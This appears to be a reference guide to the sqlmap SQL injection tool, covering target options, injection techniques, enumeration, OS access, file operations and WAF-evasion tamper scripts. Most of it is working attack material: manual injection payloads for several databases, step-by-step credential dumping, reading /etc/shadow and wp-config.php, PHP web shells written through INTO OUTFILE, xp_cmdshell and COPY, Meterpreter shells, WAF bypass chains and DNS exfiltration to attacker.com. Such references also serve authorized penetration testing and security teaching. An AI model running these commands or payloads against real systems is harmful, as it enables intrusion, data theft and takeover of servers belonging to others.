---
title: "sqlmap - Official Documentation Reference"
category: "tools"
tags: ["sql-injection", "database", "exploitation", "sqlmap"]
last_updated: "2025-12-27"
sources:
  - type: github
    url: "https://github.com/sqlmapproject/sqlmap"
  - type: wiki
    url: "https://github.com/sqlmapproject/sqlmap/wiki"
  - type: official
    url: "https://sqlmap.org/"
---

# sqlmap - Official Documentation Reference

> Automatic SQL injection and database takeover tool

## Table of Contents

- [Overview](#overview)
- [Installation and Requirements](#installation-and-requirements)
- [Target Specification Options](#target-specification-options)
- [Request Customization](#request-customization)
- [Detection Options](#detection-options)
- [SQL Injection Techniques (BEUSTQ)](#sql-injection-techniques-beustq)
- [Enumeration Options](#enumeration-options)
- [OS Access](#os-access)
- [File Operations](#file-operations)
- [Tamper Scripts](#tamper-scripts)
- [Optimization and Performance](#optimization-and-performance)
- [Output and Logging](#output-and-logging)
- [Practical Examples](#practical-examples)
- [Quick Reference](#quick-reference)

---

## Overview

sqlmap is an open-source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws and taking over database servers. It comes with a powerful detection engine, many niche features for the ultimate penetration tester, and a broad range of switches lasting from database fingerprinting, over data fetching from the database, to accessing the underlying file system and executing commands on the operating system via out-of-band connections.

### Key Features

- Full support for MySQL, Oracle, PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird, Sybase, SAP MaxDB, Informix, MariaDB, MemSQL, TiDB, CockroachDB, HSQLDB, H2, MonetDB, Apache Derby, Amazon Redshift, Vertica, Mckoi, Presto, Altibase, MimerSQL, CrateDB, Greenplum, Drizzle, Apache Ignite, Cubrid, InterSystems Cache, IRIS, eXtremeDB, FrontBase, Raima Database Manager, YugabyteDB and Virtuoso DBMS
- Full support for six SQL injection techniques: boolean-based blind, time-based blind, error-based, UNION query-based, stacked queries and out-of-band
- Support for directly connecting to the database without passing via a SQL injection, by providing DBMS credentials, IP address, port, and database name
- Support for enumerating users, password hashes, privileges, roles, databases, tables and columns
- Automatic recognition of password hash formats and support for cracking them using dictionary-based attack
- Support for dumping database tables entirely, a range of entries or specific columns as per user's choice
- Support for searching for specific database names, tables across all databases, or columns across all tables
- Support for downloading and uploading any file from the database server underlying file system when the database software is MySQL, PostgreSQL or Microsoft SQL Server
- Support for executing arbitrary commands and retrieving their standard output on the database server underlying operating system
- Support for establishing an out-of-band stateful TCP connection between the attacker machine and the database server underlying operating system
- Support for escalating user privileges of the database process user via Metasploit's Meterpreter getsystem command

---

## Installation and Requirements

### Requirements

- Python version 2.6, 2.7 and 3.x on any platform

### Installation Methods

#### From Git (Recommended - Latest Version)

```bash
# Clone the repository
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev

# Run sqlmap
cd sqlmap-dev
python sqlmap.py -h
```

#### Package Managers

```bash
# Debian/Ubuntu/Kali Linux (pre-installed on Kali)
sudo apt install sqlmap

# Arch Linux
sudo pacman -S sqlmap

# Fedora
sudo dnf install sqlmap

# macOS (Homebrew)
brew install sqlmap
```

#### Using pip/pipx

```bash
# Using pipx (recommended for isolation)
pipx install sqlmap

# Using pip
pip install sqlmap
```

#### Verify Installation

```bash
# Check version
sqlmap --version

# Display help
sqlmap -h

# Display advanced help
sqlmap -hh
```

---

## Target Specification Options

### URL Target (-u, --url)

```bash
# Basic GET parameter testing
sqlmap -u "http://target.com/page.php?id=1"

# Multiple parameters (test specific one with -p)
sqlmap -u "http://target.com/page.php?id=1&cat=2" -p id

# Test all parameters
sqlmap -u "http://target.com/page.php?id=1&cat=2"

# With URL-encoded characters
sqlmap -u "http://target.com/page.php?query=test%20value"
```

### Request File (-r)

Load HTTP request from a file (e.g., saved from Burp Suite).

```bash
# Use request file
sqlmap -r request.txt

# Specify parameter to test
sqlmap -r request.txt -p "username"

# With batch mode
sqlmap -r request.txt --batch
```

Example request file:
```http
POST /login.php HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=abc123
Content-Length: 35

username=admin&password=test123
```

### Google Dork (-g)

Search Google for targets and test them automatically.

```bash
# Search and test
sqlmap -g "inurl:index.php?id="

# With specific testing
sqlmap -g "inurl:news.php?id=" --batch --random-agent
```

### Direct Database Connection (-d)

Connect directly to a database without HTTP.

```bash
# MySQL direct connection
sqlmap -d "mysql://user:password@host:3306/database"

# PostgreSQL
sqlmap -d "postgresql://user:password@host:5432/database"

# Microsoft SQL Server
sqlmap -d "mssql://user:password@host:1433/database"

# Oracle
sqlmap -d "oracle://user:password@host:1521/database"
```

### Log File Parsing (-l)

Parse targets from Burp or WebScarab proxy log.

```bash
# Burp Suite log
sqlmap -l burp_log.txt

# With scope filter
sqlmap -l burp_log.txt --scope="(www)?\.target\.com"
```

### Bulk File (-m)

Test multiple targets from a file (one URL per line).

```bash
# File with URLs
sqlmap -m targets.txt --batch
```

### Configuration File (-c)

Load options from a configuration INI file.

```bash
sqlmap -c sqlmap.conf
```

### Custom Injection Point (*)

Mark specific injection points with asterisk.

```bash
# In URL
sqlmap -u "http://target.com/page/1*/view"

# In POST data
sqlmap -u "http://target.com/api" --data="id=1*&action=view"

# In header
sqlmap -u "http://target.com" --headers="X-Id: 1*"

# In Cookie
sqlmap -u "http://target.com" --cookie="id=1*"
```

---

## Request Customization

### HTTP Method and Data

```bash
# POST data (--data)
sqlmap -u "http://target.com/login.php" --data="user=admin&pass=test"

# Specify parameter delimiter
sqlmap -u "http://target.com/api" --data="user=admin;pass=test" --param-del=";"

# Force POST method
sqlmap -u "http://target.com/api?id=1" --method=POST

# PUT/DELETE/PATCH methods
sqlmap -u "http://target.com/api/1" --method=PUT --data='{"status":"active"}'
```

### Headers

```bash
# Custom headers (--headers)
sqlmap -u "http://target.com/api" --headers="X-Auth: token123\nX-Custom: value"

# User-Agent (--user-agent or -A)
sqlmap -u "URL" --user-agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64)"

# Random User-Agent (--random-agent)
sqlmap -u "URL" --random-agent

# Referer (--referer)
sqlmap -u "URL" --referer="http://google.com"

# Host header (--host)
sqlmap -u "URL" --host="custom.target.com"
```

### Cookies

```bash
# Set cookies (--cookie)
sqlmap -u "URL" --cookie="PHPSESSID=abc123; logged_in=1"

# Load cookies from file (--load-cookies)
sqlmap -u "URL" --load-cookies=cookies.txt

# Ignore Set-Cookie (--drop-set-cookie)
sqlmap -u "URL" --cookie="session=abc" --drop-set-cookie

# Cookie delimiter (--cookie-del)
sqlmap -u "URL" --cookie="id=1;user=admin" --cookie-del=";"
```

### Authentication

```bash
# HTTP Basic/Digest/NTLM authentication
sqlmap -u "URL" --auth-type=Basic --auth-cred="user:password"
sqlmap -u "URL" --auth-type=Digest --auth-cred="user:password"
sqlmap -u "URL" --auth-type=NTLM --auth-cred="DOMAIN\\user:password"

# Client-side certificate
sqlmap -u "https://target.com" --auth-file=client.pem

# Private key
sqlmap -u "URL" --auth-file=client.pem --auth-cert="keypass"
```

### Proxy Configuration

```bash
# HTTP/HTTPS proxy (--proxy)
sqlmap -u "URL" --proxy="http://127.0.0.1:8080"

# Proxy with authentication
sqlmap -u "URL" --proxy="http://user:pass@127.0.0.1:8080"

# SOCKS proxy
sqlmap -u "URL" --proxy="socks5://127.0.0.1:1080"

# Tor network
sqlmap -u "URL" --tor --tor-type=SOCKS5 --tor-port=9050 --check-tor

# Proxy from file (rotation)
sqlmap -u "URL" --proxy-file=proxies.txt

# Ignore proxy for specific hosts
sqlmap -u "URL" --proxy="http://127.0.0.1:8080" --ignore-proxy
```

### Timeouts and Retries

```bash
# Connection timeout (--timeout)
sqlmap -u "URL" --timeout=30

# Retries on connection issues (--retries)
sqlmap -u "URL" --retries=5

# Delay between requests (--delay)
sqlmap -u "URL" --delay=1

# Random delay range (--randomize)
sqlmap -u "URL" --delay=0.5 --safe-freq=3
```

### SSL/TLS Options

```bash
# Ignore SSL certificate errors
sqlmap -u "https://target.com" --force-ssl

# Skip URL encoding
sqlmap -u "URL" --skip-urlencode

# Disable HTTP 301/302 redirects
sqlmap -u "URL" --ignore-redirects
```

---

## Detection Options

### Level (--level)

Controls the breadth of tests performed (1-5, default: 1).

| Level | Tests Performed |
|-------|----------------|
| 1 | Default - GET and POST parameters |
| 2 | + HTTP Cookie header values |
| 3 | + HTTP User-Agent and Referer headers |
| 4 | + Additional payloads and boundary combinations |
| 5 | + Host header, all parameters tested extensively |

```bash
# Test cookies
sqlmap -u "URL" --level=2

# Test User-Agent and Referer
sqlmap -u "URL" --level=3

# Maximum coverage
sqlmap -u "URL" --level=5
```

### Risk (--risk)

Controls the risk level of payloads (1-3, default: 1).

| Risk | Payload Types |
|------|---------------|
| 1 | Innocuous payloads only (default) |
| 2 | + Heavy time-based queries |
| 3 | + OR-based payloads (can modify/delete data!) |

```bash
# Higher risk for more detection
sqlmap -u "URL" --risk=2

# WARNING: Risk 3 may modify database data
sqlmap -u "URL" --risk=3

# Maximum detection
sqlmap -u "URL" --level=5 --risk=3
```

### String Matching

```bash
# Match string in TRUE response (--string)
sqlmap -u "URL" --string="Welcome back"

# Match string in FALSE response (--not-string)
sqlmap -u "URL" --not-string="Invalid credentials"

# Use regex pattern (--regexp)
sqlmap -u "URL" --regexp="user[0-9]+"

# Match HTTP status code (--code)
sqlmap -u "URL" --code=200

# Match page title (--titles)
sqlmap -u "URL" --titles
```

### Other Detection Options

```bash
# Force specific DBMS (--dbms)
sqlmap -u "URL" --dbms=mysql
sqlmap -u "URL" --dbms=mssql
sqlmap -u "URL" --dbms=postgresql
sqlmap -u "URL" --dbms=oracle

# Force specific OS (--os)
sqlmap -u "URL" --os=linux
sqlmap -u "URL" --os=windows

# Skip payloads requiring specific condition (--skip)
sqlmap -u "URL" --skip="AND,OR"

# Test for specific injection type only
sqlmap -u "URL" --test-filter="Generic UNION"

# Skip specific tests
sqlmap -u "URL" --test-skip="MySQL"
```

---

## SQL Injection Techniques (BEUSTQ)

sqlmap supports six SQL injection techniques, represented by the letters BEUSTQ.

### Technique Flags (--technique)

| Flag | Technique | Description |
|------|-----------|-------------|
| B | Boolean-based blind | Infers data via true/false responses |
| E | Error-based | Extracts data from error messages |
| U | UNION query-based | Appends UNION SELECT statements |
| S | Stacked queries | Executes multiple statements |
| T | Time-based blind | Infers data via response delays |
| Q | Inline queries | Nested sub-queries |

```bash
# Use all techniques (default)
sqlmap -u "URL" --technique=BEUSTQ

# Boolean and UNION only
sqlmap -u "URL" --technique=BU

# Time-based only (stealthier but slower)
sqlmap -u "URL" --technique=T

# Error-based only (fastest when available)
sqlmap -u "URL" --technique=E
```

### Boolean-Based Blind (B)

Infers data by analyzing differences in application responses.

```bash
# Boolean-based testing
sqlmap -u "URL" --technique=B

# Specify comparison strings
sqlmap -u "URL" --technique=B --string="Welcome"
sqlmap -u "URL" --technique=B --not-string="error"

# Custom comparison ratio
sqlmap -u "URL" --technique=B --text-only
```

Manual payloads for understanding:
```sql
-- MySQL
' AND 1=1--     (TRUE - normal response)
' AND 1=2--     (FALSE - different response)
' AND SUBSTRING(database(),1,1)='a'--

-- MSSQL
' AND 1=1--
' AND SUBSTRING(DB_NAME(),1,1)='a'--

-- PostgreSQL
' AND 1=1--
' AND SUBSTRING(current_database(),1,1)='a'--
```

### Error-Based (E)

Extracts data directly from database error messages.

```bash
# Error-based testing
sqlmap -u "URL" --technique=E

# With specific DBMS
sqlmap -u "URL" --technique=E --dbms=mysql
```

Manual payloads:
```sql
-- MySQL (extractvalue/updatexml)
' AND extractvalue(1,concat(0x7e,(SELECT database()),0x7e))--
' AND updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)--

-- MSSQL
' AND 1=CONVERT(int,(SELECT DB_NAME()))--

-- PostgreSQL
' AND 1=CAST((SELECT version()) AS int)--

-- Oracle
' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE ROWNUM=1))--
```

### UNION Query-Based (U)

Appends UNION SELECT to retrieve data in a single response.

```bash
# UNION-based testing
sqlmap -u "URL" --technique=U

# Specify known column count
sqlmap -u "URL" --technique=U --union-cols=5

# Specify column range to test
sqlmap -u "URL" --technique=U --union-cols=1-20

# Specify NULL or other character for column filling
sqlmap -u "URL" --technique=U --union-char=NULL

# Specify FROM clause (for Oracle/other DBs requiring it)
sqlmap -u "URL" --technique=U --union-from=dual
```

### Stacked Queries (S)

Executes multiple SQL statements separated by semicolons.

```bash
# Stacked queries testing
sqlmap -u "URL" --technique=S
```

Database support:
| DBMS | Support |
|------|---------|
| MySQL | Limited (requires mysqli with multi_query) |
| MSSQL | Full support |
| PostgreSQL | Full support |
| Oracle | Not supported |
| SQLite | Full support |

### Time-Based Blind (T)

Infers data by measuring response time differences.

```bash
# Time-based testing
sqlmap -u "URL" --technique=T

# Custom delay (default: 5 seconds)
sqlmap -u "URL" --technique=T --time-sec=10

# For unstable connections
sqlmap -u "URL" --technique=T --time-sec=15
```

Manual payloads:
```sql
-- MySQL
' AND SLEEP(5)--
' AND IF(SUBSTRING(database(),1,1)='a',SLEEP(5),0)--

-- MSSQL
'; WAITFOR DELAY '0:0:5'--

-- PostgreSQL
'; SELECT pg_sleep(5)--

-- Oracle
' AND DBMS_LOCK.SLEEP(5)--
```

### Inline Queries (Q)

Uses nested sub-queries for injection.

```bash
# Inline queries testing
sqlmap -u "URL" --technique=Q
```

---

## Enumeration Options

### Basic Enumeration

```bash
# Get current database user
sqlmap -u "URL" --current-user

# Get current database name
sqlmap -u "URL" --current-db

# Get database server hostname
sqlmap -u "URL" --hostname

# Check if user is database administrator
sqlmap -u "URL" --is-dba

# Get all information at once
sqlmap -u "URL" --current-user --current-db --hostname --is-dba
```

### User Enumeration

```bash
# List all database users
sqlmap -u "URL" --users

# Get password hashes
sqlmap -u "URL" --passwords

# Enumerate user privileges
sqlmap -u "URL" --privileges

# Enumerate user privileges for specific user
sqlmap -u "URL" --privileges -U root

# Enumerate roles
sqlmap -u "URL" --roles
```

### Database Structure Enumeration

```bash
# List all databases
sqlmap -u "URL" --dbs

# List tables in a database
sqlmap -u "URL" -D database_name --tables

# List columns in a table
sqlmap -u "URL" -D database_name -T table_name --columns

# Get database schema
sqlmap -u "URL" --schema

# Count table entries
sqlmap -u "URL" -D database_name -T table_name --count
```

### Data Extraction (Dumping)

```bash
# Dump all entries from a table
sqlmap -u "URL" -D database_name -T table_name --dump

# Dump specific columns
sqlmap -u "URL" -D database_name -T table_name -C username,password --dump

# Dump with row limit
sqlmap -u "URL" -D database_name -T table_name --dump --start=1 --stop=10

# Dump with WHERE clause
sqlmap -u "URL" -D database_name -T users --dump --where="username='admin'"

# Dump all tables in a database
sqlmap -u "URL" -D database_name --dump

# Dump all databases (CAUTION: can be very large)
sqlmap -u "URL" --dump-all

# Exclude system databases when dumping
sqlmap -u "URL" --dump-all --exclude-sysdbs
```

### Search Functionality

```bash
# Search for database containing keyword
sqlmap -u "URL" --search -D user

# Search for table containing keyword
sqlmap -u "URL" --search -T pass

# Search for column containing keyword
sqlmap -u "URL" --search -C password
```

### SQL Shell

```bash
# Interactive SQL shell
sqlmap -u "URL" --sql-shell

# Execute specific SQL query
sqlmap -u "URL" --sql-query="SELECT * FROM users LIMIT 5"

# Execute SQL file
sqlmap -u "URL" --sql-file=queries.sql
```

---

## OS Access

### Requirements

- Database user must have elevated privileges (DBA or equivalent)
- Writable directory on target server
- Known web application root path (for web shell)

### OS Shell (--os-shell)

```bash
# Get interactive OS shell
sqlmap -u "URL" --os-shell

# Specify web root for shell upload
sqlmap -u "URL" --os-shell --web-root="/var/www/html"

# Specify writable directory
sqlmap -u "URL" --os-shell --tmp-dir="/tmp"
```

### OS Command Execution (--os-cmd)

```bash
# Execute single command
sqlmap -u "URL" --os-cmd="whoami"

# Execute command on Windows
sqlmap -u "URL" --os-cmd="dir C:\\"

# PowerShell command
sqlmap -u "URL" --os-cmd="powershell -c Get-Process"
```

### Meterpreter/VNC Shell (--os-pwn)

```bash
# Get Meterpreter shell via Metasploit
sqlmap -u "URL" --os-pwn

# Specify Metasploit path
sqlmap -u "URL" --os-pwn --msf-path=/opt/metasploit-framework

# With privilege escalation attempt
sqlmap -u "URL" --os-pwn --priv-esc
```

### Database-Specific OS Access

#### MySQL
```bash
# Requires FILE privilege and secure_file_priv not restrictive
sqlmap -u "URL" --os-shell --dbms=mysql

# UDF injection for code execution
sqlmap -u "URL" --udf-inject --shared-lib=/path/to/lib_mysqludf_sys.so
```

#### Microsoft SQL Server
```bash
# Uses xp_cmdshell
sqlmap -u "URL" --os-shell --dbms=mssql

# Enable xp_cmdshell if disabled (requires sysadmin)
sqlmap -u "URL" --os-shell --dbms=mssql --enable-xp-cmdshell
```

#### PostgreSQL
```bash
# Uses COPY TO PROGRAM (PostgreSQL 9.3+)
sqlmap -u "URL" --os-shell --dbms=postgresql
```

### Out-of-Band DNS Exfiltration

```bash
# DNS exfiltration (requires DNS server control)
sqlmap -u "URL" --dns-domain=attacker.com

# Example: Data exfiltrated via DNS queries to data.attacker.com
```

---

## File Operations

### Reading Files (--file-read)

```bash
# Read Linux file
sqlmap -u "URL" --file-read="/etc/passwd"
sqlmap -u "URL" --file-read="/etc/shadow"

# Read Windows file
sqlmap -u "URL" --file-read="C:/Windows/System32/drivers/etc/hosts"
sqlmap -u "URL" --file-read="C:/Windows/win.ini"

# Read web application configuration
sqlmap -u "URL" --file-read="/var/www/html/config.php"
sqlmap -u "URL" --file-read="/var/www/html/wp-config.php"

# Read multiple files
sqlmap -u "URL" --file-read="/etc/passwd" --file-read="/etc/hosts"
```

### Writing Files (--file-write, --file-dest)

```bash
# Upload a web shell
sqlmap -u "URL" --file-write="shell.php" --file-dest="/var/www/html/shell.php"

# Upload to Windows
sqlmap -u "URL" --file-write="shell.aspx" --file-dest="C:/inetpub/wwwroot/shell.aspx"

# Upload to temp directory
sqlmap -u "URL" --file-write="payload.exe" --file-dest="/tmp/payload.exe"
```

### Database-Specific File Operations

#### MySQL
```sql
-- Requires FILE privilege
-- Check secure_file_priv: SHOW VARIABLES LIKE 'secure_file_priv';

-- Read file
SELECT LOAD_FILE('/etc/passwd');

-- Write file
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';
```

#### MSSQL
```sql
-- Read via OPENROWSET (requires permissions)
SELECT * FROM OPENROWSET(BULK 'C:\Windows\win.ini', SINGLE_CLOB) AS data;

-- Write via BCP or xp_cmdshell
EXEC xp_cmdshell 'echo ^<?php system($_GET["cmd"]); ?^> > C:\inetpub\wwwroot\shell.php';
```

#### PostgreSQL
```sql
-- Read file (superuser required)
SELECT pg_read_file('/etc/passwd', 0, 1000000);

-- Write file (9.3+)
COPY (SELECT '<?php system($_GET["cmd"]); ?>') TO '/var/www/html/shell.php';
```

---

## Tamper Scripts

Tamper scripts modify payloads to bypass WAFs, IPS, and filters.

### Listing Available Tamper Scripts

```bash
# List all tamper scripts
sqlmap --list-tampers
```

### Using Tamper Scripts

```bash
# Single tamper script
sqlmap -u "URL" --tamper=space2comment

# Multiple tamper scripts (comma-separated)
sqlmap -u "URL" --tamper="space2comment,between,randomcase"

# Chain for specific WAF
sqlmap -u "URL" --tamper="space2comment,charencode,randomcase"
```

### Common Tamper Scripts Reference

#### Space Bypass Tampers
| Script | Description | Example |
|--------|-------------|---------|
| `space2comment` | Replace space with `/**/` | `SELECT/**/password` |
| `space2dash` | Replace space with `-- \n` | MySQL-specific |
| `space2hash` | Replace space with `#\n` | MySQL-specific |
| `space2plus` | Replace space with `+` | URL-encoded contexts |
| `space2randomblank` | Random whitespace characters | General bypass |
| `space2mssqlblank` | Random MSSQL blank characters | MSSQL-specific |

#### Encoding Tampers
| Script | Description |
|--------|-------------|
| `base64encode` | Base64 encode entire payload |
| `charencode` | URL-encode all characters |
| `charunicodeencode` | Unicode URL-encode |
| `chardoubleencode` | Double URL-encode |
| `htmlencode` | HTML encode characters |

#### Keyword Bypass Tampers
| Script | Description |
|--------|-------------|
| `randomcase` | Random character casing |
| `uppercase` | Convert to uppercase |
| `lowercase` | Convert to lowercase |
| `versionedkeywords` | MySQL versioned comments |
| `versionedmorekeywords` | Extended versioned comments |

#### Comparison Bypass Tampers
| Script | Description |
|--------|-------------|
| `between` | Replace `>` with `NOT BETWEEN 0 AND` |
| `greatest` | Replace `>` with `GREATEST` |
| `equaltolike` | Replace `=` with `LIKE` |

#### Quote Bypass Tampers
| Script | Description |
|--------|-------------|
| `apostrophemask` | UTF-8 fullwidth apostrophe |
| `apostrophenullencode` | Unicode illegal apostrophe |
| `halfversionedmorekeywords` | Add versioned comment before keywords |

#### Logical Operator Bypass
| Script | Description |
|--------|-------------|
| `symboliclogical` | Replace `AND`/`OR` with `&&`/`||` |
| `unionalltounion` | Replace `UNION ALL` with `UNION` |

### WAF-Specific Tamper Combinations

```bash
# Cloudflare bypass attempt
sqlmap -u "URL" --tamper="between,charencode,space2comment,randomcase"

# ModSecurity bypass attempt
sqlmap -u "URL" --tamper="space2comment,versionedkeywords,charencode"

# Generic WAF bypass
sqlmap -u "URL" --tamper="apostrophemask,between,space2comment,randomcase"

# MySQL + WAF
sqlmap -u "URL" --tamper="space2comment,versionedkeywords,between" --dbms=mysql

# MSSQL + WAF
sqlmap -u "URL" --tamper="space2mssqlblank,between,charencode" --dbms=mssql
```

### Additional WAF Bypass Options

```bash
# Chunked transfer encoding
sqlmap -u "URL" --chunked

# HTTP Parameter Pollution
sqlmap -u "URL" --hpp

# Skip WAF detection scripts
sqlmap -u "URL" --skip-waf

# Identify WAF
sqlmap -u "URL" --identify-waf

# Safe URL to reset rate limits
sqlmap -u "URL" --safe-url="http://target.com/safe.php" --safe-freq=10
```

---

## Optimization and Performance

### Threading

```bash
# Increase concurrent threads (default: 1, max: 10)
sqlmap -u "URL" --threads=10
```

### Optimization Switches

```bash
# Turn on all optimization switches (-o)
sqlmap -u "URL" -o

# Individual optimization options:
# Keep-alive connections
sqlmap -u "URL" --keep-alive

# Predict output length (speeds up blind injection)
sqlmap -u "URL" --predict-output

# Null connection for page comparison
sqlmap -u "URL" --null-connection
```

### Reducing Detection Scope

```bash
# Force specific DBMS (skip fingerprinting)
sqlmap -u "URL" --dbms=mysql

# Use specific technique only
sqlmap -u "URL" --technique=E

# Test specific parameter only
sqlmap -u "URL" -p id

# Skip specific DBMS tests
sqlmap -u "URL" --skip="Oracle,SQLite"
```

### Batch Mode

```bash
# Never ask for user input (use defaults)
sqlmap -u "URL" --batch

# With wizard for beginners
sqlmap -u "URL" --wizard
```

### Session Management

```bash
# Clear session files (re-test from scratch)
sqlmap -u "URL" --flush-session

# Output directory
sqlmap -u "URL" --output-dir=/path/to/output

# Resume from session
sqlmap -u "URL"  # Automatically resumes if session exists
```

---

## Output and Logging

### Verbosity Levels (-v)

| Level | Description |
|-------|-------------|
| 0 | Show only Python tracebacks, error and critical messages |
| 1 | Show also information and warning messages (default) |
| 2 | Show also debug messages |
| 3 | Show also payloads injected |
| 4 | Show also HTTP requests |
| 5 | Show also HTTP responses' headers |
| 6 | Show also HTTP responses' page content |

```bash
# Show payloads
sqlmap -u "URL" -v 3

# Show full HTTP traffic
sqlmap -u "URL" -v 4

# Maximum verbosity
sqlmap -u "URL" -v 6
```

### Output Files

```bash
# Specify output directory
sqlmap -u "URL" --output-dir=/path/to/output

# Save traffic to HAR file
sqlmap -u "URL" --har=traffic.har

# Save all HTTP traffic
sqlmap -u "URL" -t traffic.txt

# CSV output format for dumps
sqlmap -u "URL" -D db -T users --dump --dump-format=CSV

# HTML output format
sqlmap -u "URL" -D db -T users --dump --dump-format=HTML
```

### Forms Parsing

```bash
# Automatically parse and test forms on page
sqlmap -u "http://target.com/login.html" --forms

# With batch mode
sqlmap -u "URL" --forms --batch
```

---

## Practical Examples

### Basic Enumeration Workflow

```bash
# Step 1: Test for injection
sqlmap -u "http://target.com/page.php?id=1" --batch

# Step 2: Get current database info
sqlmap -u "http://target.com/page.php?id=1" --current-db --current-user --is-dba --batch

# Step 3: List databases
sqlmap -u "http://target.com/page.php?id=1" --dbs --batch

# Step 4: List tables in target database
sqlmap -u "http://target.com/page.php?id=1" -D target_db --tables --batch

# Step 5: List columns in target table
sqlmap -u "http://target.com/page.php?id=1" -D target_db -T users --columns --batch

# Step 6: Dump credentials
sqlmap -u "http://target.com/page.php?id=1" -D target_db -T users -C username,password --dump --batch
```

### Testing with Burp Request

```bash
# Save request from Burp Suite to file, then:
sqlmap -r burp_request.txt --batch --dbs

# With increased level and risk
sqlmap -r burp_request.txt --level=3 --risk=2 --batch --dbs

# Through Burp proxy for traffic inspection
sqlmap -r burp_request.txt --proxy="http://127.0.0.1:8080" --batch
```

### POST Login Form Testing

```bash
# Basic POST testing
sqlmap -u "http://target.com/login.php" \
    --data="username=admin&password=test" \
    --batch

# Test specific parameter
sqlmap -u "http://target.com/login.php" \
    --data="username=admin&password=test" \
    -p username \
    --batch

# With session cookie
sqlmap -u "http://target.com/profile.php?id=1" \
    --cookie="PHPSESSID=abc123" \
    --batch
```

### WAF Bypass Testing

```bash
# Identify WAF
sqlmap -u "URL" --identify-waf

# Attempt bypass with common tampers
sqlmap -u "URL" \
    --tamper="space2comment,between,randomcase" \
    --random-agent \
    --delay=2 \
    --batch

# Heavy WAF bypass
sqlmap -u "URL" \
    --tamper="apostrophemask,between,charencode,space2comment,randomcase" \
    --random-agent \
    --hpp \
    --delay=3 \
    --safe-url="http://target.com/" \
    --safe-freq=5 \
    --batch
```

### OS Shell Acquisition

```bash
# Attempt OS shell
sqlmap -u "URL" --os-shell --batch

# With web root specification
sqlmap -u "URL" --os-shell --web-root="/var/www/html" --batch

# Alternative: Execute single command
sqlmap -u "URL" --os-cmd="whoami" --batch

# MSSQL xp_cmdshell
sqlmap -u "URL" --os-shell --dbms=mssql --batch
```

### File Operations

```bash
# Read sensitive files
sqlmap -u "URL" --file-read="/etc/passwd" --batch
sqlmap -u "URL" --file-read="/var/www/html/wp-config.php" --batch

# Upload web shell
echo '<?php system($_GET["cmd"]); ?>' > shell.php
sqlmap -u "URL" --file-write="shell.php" --file-dest="/var/www/html/shell.php" --batch
```

### Complete Penetration Test Example

```bash
# Full enumeration with all optimization
sqlmap -u "http://target.com/page.php?id=1" \
    -o \
    --threads=10 \
    --level=3 \
    --risk=2 \
    --batch \
    --current-db \
    --current-user \
    --is-dba \
    --dbs \
    --random-agent \
    --output-dir="/home/user/sqlmap-output"

# After finding interesting database
sqlmap -u "http://target.com/page.php?id=1" \
    -D webapp \
    --tables \
    --batch

# Dump users table
sqlmap -u "http://target.com/page.php?id=1" \
    -D webapp \
    -T users \
    --dump \
    --batch

# Attempt privilege escalation
sqlmap -u "http://target.com/page.php?id=1" \
    --os-shell \
    --batch
```

### JSON API Testing

```bash
# JSON POST data
sqlmap -u "http://api.target.com/users" \
    --data='{"id": 1, "action": "view"}' \
    --headers="Content-Type: application/json" \
    -p id \
    --batch

# With custom injection marker
sqlmap -u "http://api.target.com/users" \
    --data='{"id": 1*, "action": "view"}' \
    --headers="Content-Type: application/json" \
    --batch
```

### Second-Order SQL Injection

```bash
# Inject in registration, trigger in profile view
sqlmap -u "http://target.com/register.php" \
    --data="username=test&email=test@test.com" \
    --second-url="http://target.com/admin/users.php" \
    -p username \
    --batch
```

---

## Quick Reference

### Most Common Options

| Option | Description |
|--------|-------------|
| `-u URL` | Target URL with parameter |
| `-r FILE` | Load request from file |
| `-p PARAM` | Parameter to test |
| `--data=DATA` | POST data |
| `--cookie=COOKIE` | HTTP Cookie header |
| `--level=LEVEL` | Level of tests (1-5) |
| `--risk=RISK` | Risk of tests (1-3) |
| `--dbms=DBMS` | Force specific DBMS |
| `--technique=TECH` | Techniques to use (BEUSTQ) |
| `--batch` | Non-interactive mode |
| `--threads=N` | Concurrent threads |
| `-v LEVEL` | Verbosity level (0-6) |

### Enumeration Quick Reference

| Option | Description |
|--------|-------------|
| `--current-user` | Current database user |
| `--current-db` | Current database name |
| `--is-dba` | Check DBA status |
| `--dbs` | List databases |
| `--tables` | List tables |
| `--columns` | List columns |
| `--dump` | Dump table data |
| `-D DB` | Specify database |
| `-T TABLE` | Specify table |
| `-C COLS` | Specify columns |

### Exploitation Quick Reference

| Option | Description |
|--------|-------------|
| `--os-shell` | Interactive OS shell |
| `--os-cmd=CMD` | Execute OS command |
| `--os-pwn` | Meterpreter shell |
| `--file-read=FILE` | Read file from server |
| `--file-write=FILE` | Local file to upload |
| `--file-dest=PATH` | Remote destination path |
| `--sql-shell` | Interactive SQL shell |

### Evasion Quick Reference

| Option | Description |
|--------|-------------|
| `--tamper=SCRIPT` | Use tamper script(s) |
| `--random-agent` | Random User-Agent |
| `--proxy=PROXY` | Use HTTP proxy |
| `--tor` | Use Tor network |
| `--delay=SECONDS` | Delay between requests |
| `--hpp` | HTTP Parameter Pollution |
| `--chunked` | Chunked encoding |

---

## Additional Resources

- **Official Website**: https://sqlmap.org/
- **GitHub Repository**: https://github.com/sqlmapproject/sqlmap
- **Wiki Documentation**: https://github.com/sqlmapproject/sqlmap/wiki
- **Usage Guide**: https://github.com/sqlmapproject/sqlmap/wiki/Usage
- **Tamper Scripts**: https://github.com/sqlmapproject/sqlmap/tree/master/tamper
- **FAQ**: https://github.com/sqlmapproject/sqlmap/wiki/FAQ
